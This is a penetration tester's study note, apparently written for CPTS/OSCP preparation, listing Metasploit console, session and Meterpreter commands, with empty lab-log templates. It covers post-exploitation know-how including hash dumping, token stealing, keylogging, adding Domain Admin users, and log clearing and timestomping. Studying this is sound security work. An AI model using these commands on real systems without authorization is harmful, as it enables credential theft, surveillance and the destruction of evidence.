# Using the Metasploit Framework

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Use MSF to find, configure and run modules (exploits/auxiliary/post), catch Meterpreter sessions, and do post-exploitation. A framework to speed up known-exploit work, not a replacement for understanding the attack.

## msfconsole commands
| Command | Description |
|---|---|
| `show exploits` / `show payloads` / `show auxiliary` | List all exploits / payloads / auxiliary modules |
| `search <name>` | Search modules (also `search cve:2021 type:exploit platform:windows`) |
| `info` | Load info about the selected exploit/module |
| `use <name>` / `use <number>` | Load a module by name or by search-result index |
| `show options` | Show the module's required options |
| `show targets` | Show platforms the exploit supports |
| `show advanced` | Show advanced options |
| `set <opt> <val>` | Set an option (e.g. `set RHOSTS 10.10.10.40`) |
| `setg <opt> <val>` | Set an option **globally** (persists across modules) |
| `set target <n>` | Set a specific target index (known OS/service pack) |
| `set payload <payload>` / `set payload <n>` | Set payload by name or index (after `show payloads`) |
| `set autorunscript migrate -f` | Auto-migrate to another process right after exploitation |
| `check` | Test whether the target is vulnerable (if the module supports it) |
| `exploit` | Run the exploit |
| `exploit -j` | Run as a background job |
| `exploit -z` | Don't interact with the session after success |
| `exploit -e <encoder>` | Use a payload encoder (e.g. `shikata_ga_nai`) |
| `exploit -h` | Help for the exploit command |

**LHOST** = your IP the target can reach (often public off-LAN) — used for reverse shells. **RHOST(S)** = the target.

## Sessions
| Command | Description |
|---|---|
| `sessions -l` | List sessions (handling multiple shells) |
| `sessions -l -v` | List verbose (incl. which vuln was used) |
| `sessions -i <id>` | Interact with a session |
| `sessions -s <script>` | Run a Meterpreter script on all live sessions |
| `sessions -c <cmd>` | Run a command on all live Meterpreter sessions |
| `sessions -u <id>` | Upgrade a basic Win32 shell → Meterpreter |
| `sessions -K` | Kill all live sessions |

Use `use exploit/multi/handler` to catch a session from a standalone msfvenom payload.

## Meterpreter commands
| Command | Description |
|---|---|
| `help` | Meterpreter help |
| `run <script>` | Run a Meterpreter script (see `scripts/meterpreter`) |
| `sysinfo` | System info on the target |
| `getuid` | Current user |
| `ls` | List files/folders on the target |
| `ps` | Running processes + owning account |
| `use priv` | Load the privilege extension |
| `migrate <pid>` | Migrate into another process (from `ps`) |
| `getsystem` | Attempt elevation to SYSTEM via multiple vectors |
| `getprivs` | Grab as many privileges as possible |
| `hashdump` | Dump local SAM hashes |
| `shell` | Drop into an interactive shell with all tokens |
| `execute -f cmd.exe -i` | Execute cmd.exe and interact |
| `execute -f cmd.exe -i -t` | Execute with all available tokens |
| `execute -f cmd.exe -i -H -t` | Execute hidden, with all tokens |
| `rev2self` | Revert to the original user |
| `reg <command>` | Interact with the target registry (query/set/delete/create) |
| `setdesktop <n>` | Switch to a different desktop/session |
| `screenshot` | Screenshot the target's desktop |
| `upload <file>` / `download <file>` | File transfer to/from target |
| `background` / `bg` | Background the session, return to msfconsole |
| `reboot` | Reboot the target machine |
| `run post/multi/recon/local_exploit_suggester` | Suggest local privesc exploits |
| `portfwd add ...` / `route add ...` | Pivot through the session |

**Token stealing/impersonation** (`use incognito`):
| Command | Description |
|---|---|
| `list_tokens -u` / `list_tokens -g` | List available tokens by user / by group |
| `impersonate_token DOMAIN\\user` | Impersonate an available token |
| `steal_token <pid>` | Steal + impersonate a process's token |
| `drop_token` | Stop impersonating |

**Keylogging & sniffing:**
| Command | Description |
|---|---|
| `keyscan_start` / `keyscan_dump` / `keyscan_stop` | Start / dump / stop keystroke capture |
| `use sniffer` | Load the sniffer module |
| `sniffer_interfaces` | List target interfaces |
| `sniffer_start <id> <buffer>` / `sniffer_dump <id> out.pcap` | Start / dump capture |
| `sniffer_stats <id>` / `sniffer_stop <id>` | Stats / stop |

**AD account manipulation & UI control:**
| Command | Description |
|---|---|
| `add_user <u> <p> -h <ip>` | Add a user on the remote target |
| `add_group_user "Domain Admins" <u> -h <ip>` | Add a user to Domain Admins |
| `uictl enable keyboard/mouse` | Take control of keyboard/mouse |

**Anti-forensics** (know them, document them in the report — don't trash a client box):
| Command | Description |
|---|---|
| `clearev` | Clear the target's event logs |
| `timestomp <file> -m/-a/-c` | Alter file timestamps (creation/access/modify) |

## Database-driven attacks
| Command | Description |
|---|---|
| `db_status` / `workspace` | DB connection status / organise engagements (postgres-backed) |
| `db_create <name>` | Create a database for driven attacks |
| `db_connect <name>` | Create + connect to a database |
| `db_nmap <args>` | Run Nmap and store results in the DB (normal Nmap syntax) |
| `db_destroy` | Delete the current database (`db_destroy <user:pass@host:port/db>` for options) |

## Notes for the exam / real work
- CPTS/OSCP **limit Metasploit use** — know how to do the key attacks manually too; MSF is a time-saver, not a crutch.
- `check` before `exploit` when possible; some exploits are unstable and can crash the target.
- Meterpreter is noisy (EDR catches it); native shells / manual techniques are quieter.

> Core loop: `search → use → show options → set RHOSTS/LHOST → check → exploit → sessions`. Once you have Meterpreter: `sysinfo`, `getuid`, `migrate`, then `local_exploit_suggester` or `getsystem` for privesc.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
